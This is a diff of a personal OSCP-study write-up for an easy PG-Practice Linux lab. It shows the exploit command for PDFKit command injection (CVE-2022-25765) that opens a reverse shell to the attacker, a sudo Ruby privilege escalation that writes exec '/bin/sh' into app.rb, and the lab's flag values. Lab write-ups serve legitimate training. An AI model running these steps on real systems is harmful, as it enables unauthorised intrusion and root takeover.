@@ -1,5 +1,6 @@
 ---
 Date: 2024-10-06
+Course: "[[OSCP]]"
 Platform: PG-Practice
 Category: Linux
 Difficulty: Easy
@@ -57,45 +58,45 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ## Port 3000 - HTTP (WEBrick 1.7.0 / Ruby 3.0.2)
 - Navigated to `http://192.168.228.22:3000/`
-![[Pasted image 20241006133635.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241006133635.png]]
 - Attempted to get PDF for `http://127.0.0.1`, received error for `PDFKit`
-![[Pasted image 20241006134352.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241006134352.png]]
 - Identified PDFKit version (0.8.6) (required expanding "Backtrace" details)
 - Identified PDFKit uses url for POST parameter
-![[Pasted image 20241006135551.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241006135551.png]]
 ---
 # Exploitation
 ## Command Injection
 PDFKit 0.8.6 is vulnerable to command injection (CVE-2022–25765), then identified exploit `51293.py` is available to use command injection to create a reverse shell.
 - Ran exploit command;
   `python3 51293.py -s 192.168.45.175 80 -w http://192.168.228.22:3000/pdf -p url`
-  ![[Pasted image 20241006140548.png]]
+  ![[Cybersecurity-Resources/images/Pasted image 20241006140548.png]]
 - Caught reverse shell as `andrew` with Netcat listener
-![[Pasted image 20241006140629.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241006140629.png]]
 
 ---
 # Lateral Movement to user
 ## Local Enumeration
 - Upgrade to full TTY, moved to `andrew` home directory, printed `local.txt`
-![[Pasted image 20241006140943.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241006140943.png]]
 - Ran `cat /etc/passwd` to also find `offsec` user
-![[Pasted image 20241006141118.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241006141118.png]]
 - Ran `sudo -l` to find `andrew` has sudo privilege for `/usr/bin/ruby`
-![[Pasted image 20241006141248.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241006141248.png]]
 - Ran `ls -lah` inside `/app` directory and identified `andrew` has `rwx` privilege over `app.rb`
-![[Pasted image 20241006144015.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241006144015.png]]
 ---
 # Privilege Escalation
 ## Sudo Binary - GTFOBins
 - Identified `andrew` has sudo privilege of `/home/andrew/app/app.rb`, and relevant binary vulnerability found on GTFObins
-![[Pasted image 20241006144115.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241006144115.png]]
 - Echoed `exec "/bin/sh"` into `app.rb` 
-![[Pasted image 20241006144334.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241006144334.png]]
 - Ran `app.rb` as Sudo to achieve `root`
-![[Pasted image 20241006144355.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241006144355.png]]
 
 ---
 # Trophy & Loot
 `local.txt` = `a779352dd3270666856f7cbd34073f4b`
 `root.txt` = `78aba0e8e3abe4e15304b6fda4649006`
-![[Pasted image 20241006144618.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241006144618.png]]
